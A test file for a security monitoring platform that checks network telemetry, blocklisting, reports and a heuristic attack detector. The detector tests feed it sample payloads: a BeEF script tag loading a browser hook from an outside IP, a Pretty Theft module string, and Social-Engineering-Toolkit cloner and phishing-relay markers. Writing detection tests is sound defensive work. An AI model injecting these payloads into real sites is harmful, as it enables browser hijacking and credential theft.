import { describe, it, expect, beforeAll } from 'vitest';
import { db } from '../src/db/database';
import { REGISTERED_TENANTS } from '../src/config';
import { socEngine } from '../src/soc/soc-engine';
import { heuristicEngine } from '../src/threat/heuristic-engine';
import { zeekEngine } from '../src/zeek/zeek-engine';
import { advisorService } from '../src/advisor/advisor-service';
import { pdfReportGenerator, csvReportGenerator } from '../src/reports/pdf-generator';

describe('Full 7-Level Observability & All Subsystems Operational Verification', () => {
  beforeAll(async () => {
    await db.initialize();
    await socEngine.syncFromDatabase();
  });

  it('Level 1: Wireshark DPI & Zeek NSM (connections, notices, EPS metrics, intel & UID timeline)', async () => {
    const connections = await zeekEngine.getConnections({ limit: 50 });
    expect(connections.length).toBeGreaterThan(0);

    const notices = await zeekEngine.getNotices();
    expect(notices.length).toBeGreaterThan(0);

    const epsMetrics = await zeekEngine.getSensorEpsMetrics();
    expect(epsMetrics).toBeDefined();

    const intel = await zeekEngine.getThreatIntelAndHashes();
    expect(intel).toBeDefined();

    // Verify UID Correlation Timeline
    const sampleUid = connections[0].uid;
    const timeline = await zeekEngine.getTimelineByUid(sampleUid);
    expect(timeline.uid).toBe(sampleUid);
  });

  it('Level 2, 3 & 4: Synthetic Endpoint Probes & Database Query Latency Analyzer', async () => {
    const probes = await db.getProbes();
    expect(probes.length).toBeGreaterThan(0);

    const queryMetrics = await db.getQueryMetrics(undefined, 20);
    expect(Array.isArray(queryMetrics)).toBe(true);
  });

  it('Level 5: Multi-Tenant Connected Systems & Overview Telemetry', async () => {
    const tenants = Object.values(REGISTERED_TENANTS);
    expect(tenants.length).toBeGreaterThan(0);
    const nounHrms = tenants.find((t) => t.systemId === 'NOUN-HRMS');
    expect(nounHrms).toBeDefined();

    const overview = await db.getSystemHealthOverview();
    expect(overview.healthScore).toBeGreaterThanOrEqual(0);
    expect(overview.timestampWat).toContain('WAT');
  });

  it('Level 6: Anti-BeEF Browser Hook & Anti-SET Social Engineering Detection', () => {
    // 1. BeEF Hook script injection detection
    const beefEval = heuristicEngine.evaluate({
      method: 'POST',
      path: '/api/v1/staff/profile/bio',
      payload: `<script src="http://185.220.101.44:3000/hook.js"></script>`,
      userAgent: 'Mozilla/5.0',
      clientIp: '185.220.101.44',
    });
    expect(beefEval.detected).toBe(true);
    expect(beefEval.incidentType).toBe('BEEF_BROWSER_HOOK');
    expect(beefEval.severity).toBe('CRITICAL');

    // 2. BeEF Pretty Theft overlay detection
    const prettyTheftEval = heuristicEngine.evaluate({
      method: 'POST',
      path: '/api/v1/soc/csp-report',
      payload: `module=pretty_theft&BEEFHOOK=8f92a1c4b7e2091d3a55`,
      clientIp: '194.26.29.145',
    });
    expect(prettyTheftEval.detected).toBe(true);
    expect(prettyTheftEval.incidentType).toBe('BEEF_BROWSER_HOOK');

    // 3. SET Credential Harvester & Site Cloner detection
    const setClonerEval = heuristicEngine.evaluate({
      method: 'GET',
      path: '/login',
      payload: 'X-SET-Site-Cloner: mirror=https://hrms.noun.edu.ng/login',
      userAgent: 'Mozilla/5.0 (compatible; Social-Engineering-Toolkit/8.0.3; SET-Credential-Harvester; HTTrack 3.49)',
      clientIp: '45.154.255.170',
    });
    expect(setClonerEval.detected).toBe(true);
    expect(setClonerEval.incidentType).toBe('SET_SOCIAL_ENGINEERING');

    // 4. SET Lookalike Typosquatted Domain Relay detection
    const setHarvesterEval = heuristicEngine.evaluate({
      method: 'POST',
      path: '/api/v1/auth/login',
      payload: `phish_relay_origin=https://n0un-hrms-portal.com/login&X-SET-Harvester-Relay=true`,
      clientIp: '91.215.85.19',
    });
    expect(setHarvesterEval.detected).toBe(true);
    expect(setHarvesterEval.incidentType).toBe('SET_SOCIAL_ENGINEERING');
    expect(setHarvesterEval.severity).toBe('CRITICAL');

    // 5. Routine UI flags like "--script=vuln" or "Zeek NSM --verbose" MUST NOT trigger SQL comment truncation false positives
    const safeUiEval = heuristicEngine.evaluate({
      method: 'POST',
      path: '/api/v1/audit/track',
      payload: 'Clicked <button> "Surface Audit --script=vuln --open"',
      clientIp: '127.0.0.1',
    });
    expect(safeUiEval.detected).toBe(false);
  });

  it('Level 7: SOAR War Room, Permanent IP Blocklist, Self-Healing Advisor & Forensic Reports', async () => {
    const metrics = socEngine.getSocMetrics();
    expect(metrics).toBeDefined();
    expect(socEngine.getBlocklist().length).toBeGreaterThan(0);
    expect(socEngine.getPlaybooks().length).toBeGreaterThan(0);
    expect(socEngine.getDetectionRules().length).toBeGreaterThan(0);

    // Block and Unblock lifecycle
    const testIp = '203.0.113.199';
    socEngine.blockIp({
      ip: testIp,
      reason: 'Operational Verification Test Block',
      threatClassification: 'Test Threat',
      systemId: 'NOUN-HRMS & THE-WATCH-SOC',
      blockedBy: 'Super Admin Verification',
    });
    expect(socEngine.isIpBlocked(testIp)).toBe(true);

    socEngine.unblockIp(testIp, 'Super Admin Verification');
    expect(socEngine.isIpBlocked(testIp)).toBe(false);

    // Advisor recommendations
    const rules = advisorService.getAllRules();
    expect(rules.length).toBeGreaterThan(0);

    // PDF & CSV generators
    const pdfBuf = await pdfReportGenerator.generatePdf({});
    expect(pdfBuf.toString('utf-8', 0, 5)).toBe('%PDF-');
    const csvStr = await csvReportGenerator.generateCsv();
    expect(csvStr).toContain('IncidentID,SystemID,TimestampWAT');
  });
});
